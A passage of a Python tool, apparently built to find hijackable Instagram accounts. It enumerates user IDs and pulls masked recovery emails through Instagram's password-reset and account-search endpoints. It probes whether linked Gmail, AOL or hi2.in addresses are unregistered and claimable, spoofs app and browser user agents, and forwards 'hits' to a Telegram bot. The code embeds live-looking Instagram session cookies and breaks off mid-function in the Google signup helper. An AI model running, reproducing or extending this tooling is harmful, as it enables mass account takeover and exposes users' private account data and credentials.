import os
import sys
import re
import json
import string
import random
from random import randrange, choice
import uuid
import time
from datetime import datetime
from threading import Thread, Lock, Event, Semaphore
import queue
import requests
import urllib.parse
import base64
import secrets
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
import hashlib
import httpx

init(autoreset=True)

R     = Fore.RED
G     = Fore.GREEN
Y     = Fore.YELLOW
C     = Fore.CYAN
W     = Fore.WHITE
M     = Fore.MAGENTA
RESET = Style.RESET_ALL
B     = Style.BRIGHT

WORKING_RANGES = [
    (1,             5000000,    2010),
    (5000001,       17750000,   2011),
    (17750001,      279760000,  2012),
    (279760001,     900990000,  2013),
    (900990001,     1629010000, 2014),
    (1629010001,    2369359761, 2015),
    (2369359762,    4239516754, 2016),
    (4239516755,    6345108209, 2017),
    (6345108210,    10016232395,2018),
    (10016232396,   27238602159,2019),
    (27238602160,   43464475395,2020),
    (43464475395,   50289297647,2021),
    (50289297647,   57464707082,2022),
    (57464707082,   63313426938,2023),
    (63313426938,   70134323896,2024),
    (70313426938,   78313496938,2025),
]

def gdate(user_id):
    try:
        user_id = int(user_id)
        for lower, upper, year in WORKING_RANGES:
            if lower <= user_id <= upper:
                return year
        return 2019
    except Exception:
        return 2019

# ── Hits file ──
HITS_FILE       = "weyn_hits.txt"
_hits_file_lock = Lock()

def _write_session_separator(method_num):
    ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    sep = (
        "\n" +
        "═" * 54 + "\n" +
        f"  SESSION — METHOD {method_num}  |  {ts}\n" +
        "═" * 54 + "\n\n"
    )
    with _hits_file_lock:
        with open(HITS_FILE, 'a', encoding='utf-8') as f:
            f.write(sep)

def _save_hit_to_file(output):
    with _hits_file_lock:
        with open(HITS_FILE, 'a', encoding='utf-8') as f:
            f.write(output + "\n\n")

# ── Global session registry (used by Stop to kill in-flight requests) ──
_active_sessions      = []
_active_sessions_lock = Lock()

def _register_session(s):
    with _active_sessions_lock:
        _active_sessions.append(s)
    return s

def close_all_sessions():
    with _active_sessions_lock:
        for s in _active_sessions:
            try:
                s.close()
            except Exception:
                pass
        _active_sessions.clear()

def force_stop():
    """Immediately shut down all thread pools and mark state as stopped."""
    _web_state['running'] = False
    for pool_name in ('_m1_pool', '_m1_lookup_pool', '_m2_pool', '_m3_pool'):
        pool = globals().get(pool_name)
        if pool is not None:
            try:
                pool.shutdown(wait=False, cancel_futures=True)
            except Exception:
                pass
    close_all_sessions()

def _send_telegram(token, chat_id, text):
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": text},
            timeout=10
        )
        body = resp.json()
        if body.get('ok'):
            _web_state['tg_status'] = 'ok'
            _web_state['tg_error']  = ''
            return True
        else:
            err = body.get('description', 'Unknown Telegram error')
            _web_state['tg_status'] = 'error'
            _web_state['tg_error']  = err
            return resp.status_code, body
    except Exception as e:
        _web_state['tg_status'] = 'error'
        _web_state['tg_error']  = str(e)
        return False


# ── Telegram send queue ──
#
# Hits are produced by hundreds of concurrent scanner threads, but Telegram
# only allows ~1 message/sec per chat. Instead of firing sendMessage calls
# straight from the scanner threads (which blows through that limit and
# causes messages to silently vanish once Telegram starts rejecting them),
# every hit is pushed onto a queue and a single background thread drains it
# at a safe, steady pace. If Telegram responds with 429, the message stays
# at the front of the queue and the sender sleeps for the `retry_after`
# value Telegram provides, then retries the same message until it goes
# through -- no hit notification is ever dropped.

_TG_MIN_INTERVAL = 1.0  # seconds between sends, keeps us under Telegram's per-chat rate limit

_tg_queue = queue.Queue()
_tg_sender_started = False
_tg_sender_lock = Lock()


def _telegram_sender_loop():
    while True:
        token, chat_id, text = _tg_queue.get()
        while True:
            try:
                resp = requests.post(
                    f"https://api.telegram.org/bot{token}/sendMessage",
                    json={"chat_id": chat_id, "text": text},
                    timeout=10
                )
                if resp.status_code == 429:
                    try:
                        retry_after = resp.json().get('parameters', {}).get('retry_after', 1)
                    except Exception:
                        retry_after = 1
                    time.sleep(max(1, retry_after))
                    continue  # retry the same message, do not drop it

                body = resp.json()
                if body.get('ok'):
                    _web_state['tg_status'] = 'ok'
                    _web_state['tg_error']  = ''
                else:
                    _web_state['tg_status'] = 'error'
                    _web_state['tg_error']  = body.get('description', 'Unknown Telegram error')
            except Exception as e:
                _web_state['tg_status'] = 'error'
                _web_state['tg_error']  = str(e)
            break

        _tg_queue.task_done()
        time.sleep(_TG_MIN_INTERVAL)


def _ensure_telegram_sender():
    global _tg_sender_started
    with _tg_sender_lock:
        if not _tg_sender_started:
            Thread(target=_telegram_sender_loop, daemon=True).start()
            _tg_sender_started = True


def _queue_telegram(token, chat_id, text):
    """Enqueue a hit notification for the background Telegram sender instead
    of sending it inline from the scanner thread."""
    _ensure_telegram_sender()
    _tg_queue.put((token, chat_id, text))

def get_year_range(year_choice):
    if year_choice is None:
        return 1, 78313496938
    for lower, upper, year in WORKING_RANGES:
        if year == year_choice:
            return lower, upper
    return 1, 78313496938


# ══════════════════════════════════════════════════════════
#  METHOD 1 — STATE & COUNTERS
# ══════════════════════════════════════════════════════════

_m1_hits         = 0
_m1_bad_insta    = 0
_m1_bad_email    = 0
_m1_good_insta   = 0
_m1_total        = 0
_m1_taken        = 0
_m1_limit        = 0
_m1_scanned      = 0
_m1_found_emails = []
_m1_found_lock   = Lock()
_m1_hit_lock     = Lock()
_m1_pool:        ThreadPoolExecutor = None
_m1_lookup_pool: ThreadPoolExecutor = None

_web_state = {
    'running': False, 'method': None,
    'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
    'taken': 0, 'limit': 0, 'total': 0, 'verified': 0,
    'recent_hits': [],
    'tg_status': '', 'tg_error': '',
}
_web_lock = Lock()

# ── Configuration ──

_M1_INSTA_GRAPHQL = "https://www.instagram.com/api/graphql"
_M1_GOOGLE_URL    = "https://accounts.google.com"
_M1_FORM_TYPE     = "application/x-www-form-urlencoded; charset=UTF-8"
_M1_TOKEN_FILE    = "tokens.txt"
_M1_DOMAINS       = ["@gmail.com", "@aol.com"]

_M1_BASE_URL      = "https://www.instagram.com"
_M1_RESET_URL     = "https://www.instagram.com/accounts/password/reset/"
_M1_SEND_AJAX_URL = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
_M1_UA_WEB        = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
_M1_UA_APP        = "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)"
_M1_ABOUT_WEB_UA  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0"

_M1_USER_AGENTS = [
    "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; samsung; SM-S911B; dm1q; qcom; en_US; 475223914)",
    "Instagram 319.0.0.30.121 Android (31/12; 440dpi; 1080x2400; xiaomi; M2101K6G; sweet; qcom; en_GB; 454782345)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1240x2772; OnePlus; CPH2449; ONEPLUS11; qcom; en_US; 489234551)",
    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; google; Pixel 7; panther; gs201; en_US; 493245782)",
    "Instagram 318.0.0.22.110 Android (29/10; 400dpi; 1080x2310; HUAWEI; ELE-L29; hwELE; kirin980; en_GB; 439875334)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; vivo; V2145; PD2145; mt6893; en_US; 478932112)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; realme; RMX3710; halo; mt6833; en_GB; 469862234)",
    "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
    "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
]

_M1_WEB_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

_m1__session = requests.Session()

# ── About-session helpers ──

HARDCODED_SESSIONS = [
    {
        "csrftoken": "SA7WOqODWLd9lq8tepS9lO5hEyQiiAjf",
        "mid": "acXucwABAAEpLL9LTj_zE5mdFUm4",
        "ig_did": "68B3C797-5435-4284-91DF-36BB57ACE8EC",
        "sessionid": "37980233613%3AzkmZM0x4USstRi%3A13%3AAYgWd5cwudKpm1w0dyEb0AD6LFdG2zY5HVncDeFJfA",
        "ds_user_id": "37980233613"
    },
    {
        "csrftoken": "tPvqXDZm6bD62k-_0a2rRl",
        "mid": "acVQKgABAAHxWQ3ymupl3SPVKxqV",
        "ig_did": "02AD7E3A-B843-43E2-B5BD-520BA7392ACA",
        "sessionid": "74090320231%3ACtvz4lnFouLKGZ%3A25%3AAYg8Be6H6r7-c9Vz5Jhewf-KhM-nvusIhXYYRBqZUw",
        "ds_user_id": "74090320231"
    }
]

_m1_about_session_index = 0
_m1_about_session_lock  = Lock()
_m1_ABOUT_SESSION_ID    = ""
_m1_ABOUT_CSRF_TOKEN    = ""
_m1_ABOUT_DS_USER_ID    = ""
_m1_ABOUT_COOKIE_STR    = ""
_m1_about_tokens        = {
    "fb_dtsg": None, "lsd": None,
    "rev": "1035271382",
    "bkv": "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739"
}
_m1_about_token_lock = Lock()


def _m1_build_cookie_str(s):
    return (
        f"csrftoken={s['csrftoken']}; "
        f"ig_did={s['ig_did']}; "
        f"mid={s['mid']}; "
        f"ds_user_id={s['ds_user_id']}; "
        f"sessionid={s['sessionid']}"
    )

def _m1_next_about_session():
    global _m1_about_session_index, _m1_ABOUT_SESSION_ID, _m1_ABOUT_CSRF_TOKEN
    global _m1_ABOUT_DS_USER_ID, _m1_ABOUT_COOKIE_STR
    with _m1_about_session_lock:
        s = HARDCODED_SESSIONS[_m1_about_session_index % len(HARDCODED_SESSIONS)]
        _m1_about_session_index += 1
    _m1_ABOUT_SESSION_ID  = s["sessionid"]
    _m1_ABOUT_CSRF_TOKEN  = s["csrftoken"]
    _m1_ABOUT_DS_USER_ID  = s["ds_user_id"]
    _m1_ABOUT_COOKIE_STR  = _m1_build_cookie_str(s)
    return s

def _m1_random_about_session():
    s = random.choice(HARDCODED_SESSIONS)
    cookie_str = _m1_build_cookie_str(s)
    return s["sessionid"], s["csrftoken"], s["ds_user_id"], cookie_str

def _m1_about_refresh_tokens(cookie_str=None, username="instagram"):
    global _m1_about_tokens, _m1_ABOUT_SESSION_ID, _m1_ABOUT_COOKIE_STR
    if not _m1_ABOUT_SESSION_ID:
        return False
    _cookie = cookie_str or _m1_ABOUT_COOKIE_STR
    try:
        resp = requests.get(
            f"https://www.instagram.com/{username}/",
            headers={
                "User-Agent": _M1_ABOUT_WEB_UA,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Accept-Encoding": "gzip, deflate",
                "Cookie": _cookie,
                "Referer": "https://www.instagram.com/",
            }
        )
        html  = resp.text
        m     = re.search(r'"f":"([^"]+)"', html)
        m2    = re.search(r'"LSD"[^}]*"token":"([^"]+)"', html)
        m3    = re.search(r'"server_revision":(\d+)', html)
        m4    = re.search(r'__bkv=([a-f0-9]{40,})', html)
        m5    = re.search(r'"hsi":"([^"]+)"', html)
        dyn_m = re.search(r'"__dyn":"([^"]+)"', html)
        csr_m = re.search(r'"__csr":"([^"]+)"', html)
        with _m1_about_token_lock:
            if m:     _m1_about_tokens["fb_dtsg"] = m.group(1)
            if m2:    _m1_about_tokens["lsd"]     = m2.group(1)
            if m3:    _m1_about_tokens["rev"]     = m3.group(1)
            if m4:    _m1_about_tokens["bkv"]     = m4.group(1)
            if m5:    _m1_about_tokens["hsi"]     = m5.group(1)
            if dyn_m: _m1_about_tokens["dyn"]     = dyn_m.group(1)
            if csr_m: _m1_about_tokens["csr"]     = csr_m.group(1)
        return _m1_about_tokens["fb_dtsg"] is not None
    except Exception:
        return False

def _m1_about_token_refresher():
    while True:
        try:
            if not _m1_about_tokens.get("fb_dtsg"):
                _m1_next_about_session()
                _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR)
            else:
                _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR)
        except Exception:
            pass
        time.sleep(60)

def _m1_try_get_about(user_id, username):
    try:
        _sid, _csrf, _dsid, _cookie = _m1_random_about_session()
        with _m1_about_token_lock:
            fb_dtsg = _m1_about_tokens.get("fb_dtsg")
            lsd     = _m1_about_tokens.get("lsd") or ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            rev     = _m1_about_tokens.get("rev", "1035271382")
            bkv     = _m1_about_tokens.get("bkv", "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739")
        if not fb_dtsg:
            return {"join_date": None, "country": None, "former_usernames": []}
        hsi     = _m1_about_tokens.get("hsi", "7618017801523903853")
        dyn     = _m1_about_tokens.get("dyn", "7xeUjG1mxu1syUbFp41twpUnwgU7SbzEdF8aUco2qwJxS0DU2wx609vCwjE1EE2Cw8G11wBz81s8hwGxu786a3a1YwBgao6C0Mo2")
        csr     = _m1_about_tokens.get("csr", "")
        jazoest = '2' + str(sum(ord(c) for c in fb_dtsg))
        spin_t  = str(int(time.time()))
        post_params = {
            "__d": "www", "__user": "0", "__a": "1", "__req": "15",
            "__hs": "20529.HYP:instagram_web_pkg.2.1...0", "dpr": "1",
            "__ccg": "EXCELLENT", "__rev": rev, "__hsi": hsi,
            "__dyn": dyn, "__csr": csr, "__comet_req": "7",
            "__crn": "comet.igweb.PolarisProfilePostsTabRoute",
            "fb_dtsg": fb_dtsg, "jazoest": jazoest, "lsd": lsd,
            "__spin_r": rev, "__spin_b": "trunk", "__spin_t": spin_t,
            "params": json.dumps({"referer_type": "ProfileMore", "target_user_id": str(user_id)}),
        }
        url  = f"https://www.instagram.com/async/wbloks/fetch/?appid=com.bloks.www.ig.about_this_account&type=app&__bkv={bkv}"
        resp = requests.post(url, headers={
            "User-Agent": _M1_ABOUT_WEB_UA,
            "Accept": "*/*",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Origin": "https://www.instagram.com",
            "Referer": f"https://www.instagram.com/{username}/",
            "Cookie": _cookie,
            "X-CSRFToken": _csrf,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }, data=urllib.parse.urlencode(post_params))
        raw = resp.text
        if raw.startswith("for (;;);"):
            raw = raw[9:]
        parsed = json.loads(raw)
        if parsed.get("error") or parsed.get("status") == "fail":
            with _m1_about_token_lock:
                _m1_about_tokens["fb_dtsg"] = None
            return {"join_date": None, "country": None, "former_usernames": []}
        result   = {"join_date": None, "country": None, "former_usernames": []}
        text_str = json.dumps(parsed, ensure_ascii=False)
        for pat in [r'Katilma tarihi ([A-Za-z\u00c7\u00e7\u011e\u011f\u0130\u0131\u00d6\u00f6\u015e\u015f\u00dc\u00fc]+ \d{4})',
                    r'Date joined ([A-Za-z]+ \d{4})']:
            mt = re.search(pat, text_str)
            if mt:
                result["join_date"] = mt.group(1)
                break
        try:
            data_arr = parsed.get("payload", {}).get("layout", {}).get("bloks_payload", {}).get("data", [])
            for item in data_arr:
                if isinstance(item, dict):
                    d   = item.get("data", {})
                    key = d.get("key", "")
                    if "about_this_account_country" in key and "visibility" not in key:
                        result["country"] = d.get("initial", "Paylasilmadi")
                        break
        except Exception:
            pass
        former = re.findall(r'nceki kullan[^"]*"([a-zA-Z0-9._]{2,30})"', text_str)
        if former:
            result["former_usernames"] = list(set(former))
        return result
    except Exception:
        return {"join_date": None, "country": None, "former_usernames": []}

def _m1_get_about_account(user_id, username):
    if not _m1_about_tokens.get("fb_dtsg"):
        _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR, username)
    result = _m1_try_get_about(user_id, username)
    if result.get("join_date") or result.get("country") or result.get("former_usernames"):
        return result
    try:
        _m1_next_about_session()
        _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR, username)
        return _m1_try_get_about(user_id, username)
    except Exception:
        pass
    return result


# ── Instagram email check ──

def _m1_rest_web_check_email(email):
    try:
        with httpx.Client(http2=True, timeout=6) as client:
            response = client.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data={"email": email},
                headers={
                    "User-Agent": "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                }
            )
            data = response.json()
            return data.get("allow_shared_email_registration") is True
    except Exception:
        return False

def _m1_rest_bloks_v2(email):
    url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    device  = str(uuid.uuid4())
    family  = str(uuid.uuid4())
    android = "android-" + secrets.token_hex(8)
    payload = {
        'params': (
            '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":' + str(int(time.time())) +
            ',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) +
            '\\"}","flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED",'
            '"READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},'
            '"was_headers_prefill_available":0,"network_bssid":null,"sfdid":"",'
            '"fetched_email_token_list":{},"search_query":"' + email +
            '","auth_secure_device_id":"","ig_oauth_token":[],"cloud_trust_token":null,'
            '"was_headers_prefill_used":0,"sso_accounts_auth_data":[],"encrypted_msisdn":"",'
            '"device_network_info":null,"text_input_id":"akyuf0:61","zero_balance_state":null,'
            '"android_build_type":"release","accounts_list":[],"is_oauth_without_permission":0,'
            '"ig_android_qe_device_id":"' + device +
            '","gms_incoming_call_retriever_eligibility":"client_not_supported",'
            '"search_screen_type":"email_or_username","is_whatsapp_installed":1,'
            '"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,'
            '"headers_infra_flow_id":"","fetched_email_list":[]},'
            '"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
            '","is_from_logged_out":0,"layered_homepage_experiment_group":null,'
            '"device_id":"' + android + '","login_surface":"login_home","waterfall_id":"' +
            str(uuid.uuid4()) + '","INTERNAL__latency_qpl_instance_id":6.3987980400102E13,'
            '"is_platform_login":0,"context_data":"","login_entry_point":"logged_out",'
            '"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + family +
            '","offline_experiment_group":"caa_iteration_v3_perf_ig_4",'
            '"access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0,'
            '"qe_device_id":"' + device + '"}}'
        ),
        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
    }
    headers = {
        'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
        'accept-language': "en-IN, en-US",
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': android,
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
    }
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=8)
        if email in response.text:
            return email
        return None
    except Exception:
        return None

def _m1_rest_bloks(email):
    try:
        result = _m1_rest_bloks_v2(email)
        if result:
            return result
    except Exception:
        pass
    try:
        headers = {
            "User-Agent": "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-bloks-version-id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb",
            "x-ig-app-id": "567067343352427",
        }
        data = {
            "search_query": email,
            "bloks_versioning_id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb"
        }
        with httpx.Client(http2=True) as client:
            r = client.post(
                "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
                data=data, headers=headers
            )
        if f"We sent a link to {email}. Use that link to confirm your account." in r.text:
            return email
        return None
    except Exception:
        return None

def _m1_lookup_instagram(email):
    if _m1_rest_web_check_email(email):
        return True
    try:
        if _m1_rest_bloks(email):
            return True
    except Exception:
        pass
    return False


def _m1_hi2_is_taken(username):
    """Check whether username@hi2.in is already registered on Instagram.
    Returns True  → inbox is claimed by someone else (skip this hit).
    Returns False → inbox is free/available (proceed).
    On any error the check is skipped (returns False) so hits are not dropped.
    """
    email = f"{username}@hi2.in"
    try:
        # Fast path: check_email endpoint
        with httpx.Client(http2=True, timeout=5) as client:
            resp = client.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data={"email": email},
                headers={
                    "User-Agent": "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-ig-app-id": "567067343352427",
                }
            )
            body = resp.json()
            # email_is_taken = someone already registered their Instagram with this hi2.in address
            if body.get("email_is_taken") is True:
                return True
            # allow_shared_email_registration: True means it's on Instagram as a shared mailbox
            if body.get("allow_shared_email_registration") is True:
                return True
    except Exception:
        pass
    try:
        # Fallback: bloks search — if the email appears in the response it's registered
        result = _m1_rest_bloks_v2(email)
        if result:
            return True
    except Exception:
        pass
    return False


# ── Reset email fetch ──

def _m1_rest_v1(username):
    max_retries = 2
    for attempt in range(max_retries):
        try:
            client = httpx.Client(http2=True, follow_redirects=True)
            try:
                r0 = client.get(_M1_BASE_URL, headers={
                    "User-Agent": _M1_UA_WEB,
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
                    "Accept-Language": "tr-TR,tr;q=0.9",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                })
            except Exception:
                client.close()
                if attempt < max_retries - 1:
                    continue
                return "-"
            csrf = ""
            for c in client.cookies.jar:
                if c.name == "csrftoken":
                    csrf = c.value
                    break
            if not csrf:
                client.close()
                if attempt < max_retries - 1:
                    continue
                return "-"
            headers = {
                "User-Agent"       : _M1_UA_APP,
                "Accept"           : "*/*",
                "Accept-Language"  : "tr-TR,tr;q=0.9",
                "Accept-Encoding"  : "gzip, deflate, br",
                "Content-Type"     : "application/x-www-form-urlencoded",
                "Origin"           : _M1_BASE_URL,
                "Referer"          : _M1_RESET_URL,
                "X-CSRFToken"      : csrf,
                "X-IG-App-ID"      : "936619743392459",
                "X-Requested-With" : "XMLHttpRequest",
                "X-Instagram-AJAX" : "1",
                "X-ASBD-ID"        : "129477",
                "sec-fetch-dest"   : "empty",
                "sec-fetch-mode"   : "cors",
                "sec-fetch-site"   : "same-origin",
            }
            data = urllib.parse.urlencode({"email_or_username": username})
            r = client.post(_M1_SEND_AJAX_URL, content=data.encode(), headers=headers)
            client.close()
            result = r.json()
            status = result.get("status", "")
            if status == "ok":
                for key in ("obfuscated_email", "contact_point", "masked_email", "email"):
                    val = result.get(key)
                    if val:
                        return val
                return "-"
            elif status == "fail":
                return "Fail: " + result.get("message", "")
            if attempt < max_retries - 1:
                continue
            return "-"
        except Exception:
            if attempt < max_retries - 1:
                continue
            return "-"
    return "-"


# ── Masked email fetch ──

def _m1_get_masked(username):
    """Fetch the masked email for a username via Instagram GraphQL."""
    url = "https://www.instagram.com/api/graphql"
    lsd = ''.join(random.choices('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890', k=16))
    payload = {
        'av': "17841415868335107",
        '__d': "www", '__user': "0", '__a': "1", '__req': "1",
        '__hs': "20629.HYP:instagram_web_pkg.2.1...0",
        'dpr': "2", '__ccg': "EXCELLENT", '__rev': "1042081373",
        '__s': "4zlig1:6bh2wg:8z2xip", '__hsi': "7655152724444622381",
        '__comet_req': "7",
        'fb_dtsg': "NAfwHWr-4eRuG0p4E_PSCsCtnluTDdF08efRYHaoW-CR8dQeGFYT6Sw:17865068956001195:1782354002",
        'jazoest': "26134", 'lsd': lsd,
        '__spin_r': "1042081373", '__spin_b': "trunk", '__spin_t': "1782354136",
        'fb_api_caller_class': "RelayModern",
        'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
        'server_timestamps': "true",
        'variables': (
            '{"enable_integrity_filters":true,"id":"25025320",'
            '"__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider":true,'
            '"__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider":false,'
            '"__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider":false,'
            '"__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider":false}'
        ),
        'doc_id': "26672929172408668",
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
        'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/instagram/',
        'x-fb-lsd': lsd,
        'x-ig-app-id': '1217981644879628',
    }
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=8)
        contact_points = (
            response.json()
            .get("data", {})
            .get("caa_ar_ig_account_search", {})
            .get("contact_points", [])
        )
        return next(
            (i["contact_point"] for i in contact_points if i.get("type") == "EMAIL"),
            None
        )
    except Exception:
        return None


# ── Google / Gmail token helpers ──

_M1_TL_SESSION = requests.Session()

def _m1_gtokens():
    """Write TL/host to tokens.txt via validatepersonaldetails flow (+ batchexecute fallback)."""
    alphabet = "abcdefghijklmnopqrstuvwxyz"
    endpoint = "/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
    for _ in range(3):
        try:
            n1   = "".join(random.choice(alphabet) for _ in range(random.randint(6, 9)))
            n2   = "".join(random.choice(alphabet) for _ in range(random.randint(3, 9)))
            host = "".join(random.choice(alphabet) for _ in range(random.randint(15, 30)))
            headers = {
                "accept": "*/*",
                "accept-language": "en-GB,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf": "1",
                "user-agent": random.choice(_M1_USER_AGENTS),
            }
            res1 = requests.get(f"{_M1_GOOGLE_URL}{endpoint}", headers=headers, timeout=8)
            if res1.status_code != 200:
                continue
            tok = re.search(
                r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            )
            if not tok:
                continue
            tl = tok.group(2)
            cookies = {"__Host-GAPS": host}
            headers.update({
                "authority": "accounts.google.com",
                "origin": _M1_GOOGLE_URL,
                "referer": f"{_M1_GOOGLE_URL}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
                "user-agent": random.choice(_M1_USER_AGENTS),
            })
            data = {
                "f.req": f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                "deviceinfo": '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }
